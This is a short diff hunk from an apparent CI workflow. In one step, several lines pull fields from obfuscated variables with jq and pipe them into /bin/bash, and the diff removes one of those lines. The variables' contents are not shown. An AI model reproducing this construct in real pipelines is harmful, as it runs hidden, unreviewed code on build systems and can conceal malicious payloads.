@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$utd28377" | jq -r .qk83091 | /bin/bash
           echo $dua946 | jq -r .gxoeu81 | /bin/bash
           printf '%s' "$uspld8" | jq -r .qi0 | /bin/bash
-          printf '%s' "$map636" | jq -r .rq292 | /bin/bash
           echo $cdudx8 | jq -r .awsa37 | /bin/bash
 
       - name: Persist data
